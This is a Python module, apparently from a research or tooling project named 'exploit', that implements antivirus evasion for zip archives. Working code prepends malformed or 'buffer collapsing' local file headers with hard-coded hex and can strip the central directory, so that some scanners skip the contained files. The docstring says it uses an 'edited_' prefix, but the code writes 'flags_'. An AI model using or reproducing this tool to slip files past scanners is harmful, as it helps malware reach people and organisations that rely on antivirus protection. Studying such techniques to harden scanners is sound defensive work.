"""This implements an antivirus evasion technique for zip files
    
    By removeing the header for a file from the central directory some
    antivirus scanners skip a zipped file when scanning. When a zip file is
    processed with this tool it will automatically remove the central directory
    headers. The new file will have a prefix of edited_ attached to the file 
    name. 
"""
# import argparse
from exploit import utils
from exploit.utils import get_header_field
import os
# from posixpath import split

from .central_directory_header import CentralDirectoryHeader
from .end_central_dir_header import EndCentralDirectoryHeader
from exploit import end_central_dir_header
from .zip_file import Zip_file
from exploit import central_directory_header


# TODO add to check for exceptions when writing to file
def read_in_file(file_loc):
    """Reads in the specified file and returns the hex

    Args:
        file_loc (str): The location of the zip file to read in

    Returns:
        str: The string representation of the hex of the file
    """
    with open(file_loc, 'rb') as f:
        file_hex = f.read().hex().lower()

    return file_hex


def _create_new_file_path(file_loc, techniques={}):
    """Creates a new path to the new location of the edited zip file

    The new path is the same as the old with 
    'edited_' added in front of the old file name

    Args:
        file_loc (str): The path to the original file
        techniques (dir): What techniques were used for evasion

    Returns:
        str: The path to the location of the new file
    """
    # splits the file path between the head and the file name
    # head_tail[0]: path to the file
    # head_tail[1]: the name of the file
    head_tail = os.path.split(file_loc)
    # TODO give option so specify new file name or prefix
    prefix = 'flags'
    if 'ghost' in techniques:
        prefix = f'{prefix}_g'
    if 'invalid_header' in techniques:
        prefix = f'{prefix}_i'
    if 'buffer_collapsing' in techniques:
        prefix = f'{prefix}_b'

    prefix = f'{prefix}_'
    new_path = os.path.join(head_tail[0], f'{prefix}{head_tail[1]}')

    return new_path


def write_out_file(file_loc, contents, techniques):
    """Writes the edited file out to disk

    The location of the new file it the same as the old with an updated name

    Args:
        file_loc (str): The location of the original file
        contents (srt): What will be written to the new file
        techniques (dir): What technique was used for evasion
    """

    # TODO check for errors thrown from the file write
    new_file_path = _create_new_file_path(file_loc, techniques)
    with open(new_file_path, 'wb') as f:
        f.write(bytes.fromhex(contents))
    # TODO add return for any errors or success


def main(file_loc, techniques):
    """The main function for the program

    Args:
        file_loc (str): The location of the original zip file for the exploit
        techniques (dir): List of the techniques to ues
    """
    original_file_hex = read_in_file(file_loc)
    zip_file = Zip_file(original_file_hex)
    local_files = zip_file.get_local_file_headers()
    central_directory = zip_file.get_central_dir_hex()
    end_central_dir = zip_file.get_end_central_dir()
    # zip_file._split_central_dir()
    # local_files, central_directory, end_central_directory = _split_zip_file_into_sections(
    # original_file_hex)
    # print('\n\n\n')
    # print(original_file_hex)
    # print('\n\n\n')
    # print(local_files)
    # print('\n\n\n')
    # print(central_directory)
    # print('\n\n\n')
    # print(end_central_directory)
    # print('\n\n\n')
    invalid_file_header = ('504b03040a0000000000000000006745'
                           '23010000000000000000ffff0000612f'
                           '2f2f642f')

    buffer_collapsing_file = ('504B03040A00000000000581C2521591B5FB1E0000'
                              '001E0000000C00000066696C65317478742E747874'
                              '546869732069732074686520636F6E74656E747320'
                              '6F662066696C65312E')

    buffer_collapsing_file = (
        '504B03040A00000000009992C652ECDF463428000000280000000C000000636F6C6C617065642E7478745468657365206172656E2774207468652066696C657320796F7572206C6F6F6B696E6720666F722E')
    # print(len(invalid_file_header))
    # fie.write_out_file(file_loc=file_loc,
    #                    contents=f'{local_files}')
    # new_zip_file = f'{local_files}'
    if 'buffer_collapsing' in techniques:
        start_central_dir = zip_file._end_central_dir.get_offset_start_central_dir_from_start()
        # print(start_central_dir)
        # TODO add 30 to start_of_dir and prepend to zip
        new_file_size = utils.int_to_hex(start_central_dir + 41, 4)
        # print(new_file_size)
        # print(buffer_collapsing_file)
        buffer_collapsing_file = f'{buffer_collapsing_file[:18*2]}{new_file_size}{new_file_size}{buffer_collapsing_file[26*2:]}'
        # print(buffer_collapsing_file)
        zip_file.prepend_file(buffer_collapsing_file)
        # new_zip_file = f'{zip_file.get_local_file_headers()}{zip_file.get_central_dir_hex()}{end_central_dir.get_header_hex()}'

    if 'invalid_header' in techniques:
        zip_file.prepend_file(invalid_file_header)
        central_directory = zip_file.get_central_dir_hex()
        end_central_dir = zip_file.get_end_central_dir()
        # new_zip_file = f'{invalid_file_header}{local_files}{central_directory}{end_central_dir.get_header_hex()}'
        # new_zip_file = f'{zip_file.get_local_file_headers()}{central_directory}{end_central_dir.get_header_hex()}'

    # new_zip_file = ''
    new_zip_file = f'{zip_file.get_local_file_headers()}'
    if 'ghost' not in techniques:
        # print("not ghost")
        new_zip_file = f'{new_zip_file}{zip_file.get_central_dir_hex()}{end_central_dir.get_header_hex()}'

    # print(end_central_dir.get_offset_start_central_dir_from_start())
    # else:
    # new_zip_file = f'{new_zip_file}{local_files}{central_directory}{end_central_dir.get_header_hex()}'
    write_out_file(file_loc=file_loc,
                   contents=new_zip_file, techniques=techniques)
